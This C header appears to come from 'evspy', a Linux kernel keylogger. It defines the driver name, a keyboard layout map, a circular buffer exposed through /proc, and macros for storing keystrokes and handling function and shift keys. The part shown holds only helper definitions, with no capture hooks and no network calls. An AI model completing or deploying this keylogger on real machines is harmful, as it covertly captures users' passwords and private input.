#include <asm/page.h>
#include <linux/input.h>
#include "maps.h"

#define EVS_NAME		"evspy"				// driver name
#define EVS_MAP			map_es				// change this to your keyboard layout
#define EVS_TROLL		1					// clear this if you're a serious guy
#define EVS_BUFSIZE		PAGE_SIZE			// size of the circular buffer (4K)
#define EVS_PROCNAME	"driver/" EVS_NAME	// virtual file within /proc

#define MIN(x, y)	(x) < (y) ? (x) : (y)

/*
 * If pointer is at the end of buffer, put it at the beginning.
 * If not, simply add 1 to it.
 */
#define evs_incp(p)		\
({		\
	if ((p) == &buffer[EVS_BUFSIZE-1])		\
		(p) = buffer;		\
	else		\
		(p)++;		\
 	(p);		\
})

/*
 * Same as evs_incp but backwards
 */
#define evs_decp(p)		\
({		\
	if ((p) == buffer)		\
		(p) = &buffer[EVS_BUFSIZE-1];		\
	else		\
		(p)--;		\
 	(p);		\
})

/*
 * Insert character c where wrp is pointing and move it to the next char.
 * If rdp == wrp, increase rdp too.
 */
#define evs_insert(c)		\
({		\
	*wrp = (c);		\
	if (evs_incp(wrp) == rdp)		\
		evs_incp(rdp);		\
})

/*
 * Remove a character from the buffer
 */
#define evs_delete()		\
({		\
	if (wrp != rdp && evs_decp(wrp) == rdp)		\
		evs_decp(rdp);		\
})

/*
 * Is the c event code associated to any of the FX buttons?
 */
#define evs_isfX(c)			\
({		\
	((c) >= KEY_F1 && (c) <= KEY_F10) ||		\
	((c) == KEY_F11 || (c) == KEY_F12) ||		\
	((c) >= KEY_F13 && (c) <= KEY_F24);		\
})

#define evs_shift(c)		\
({		\
	((c) >= 'a' && (c) <= 'z') ? (c) + ('A'-'a') : (c);		\
})

// Event values
#define	EVS_VAL_FREE		0
#define	EVS_VAL_PRESS		1
#define	EVS_VAL_HOLD		2
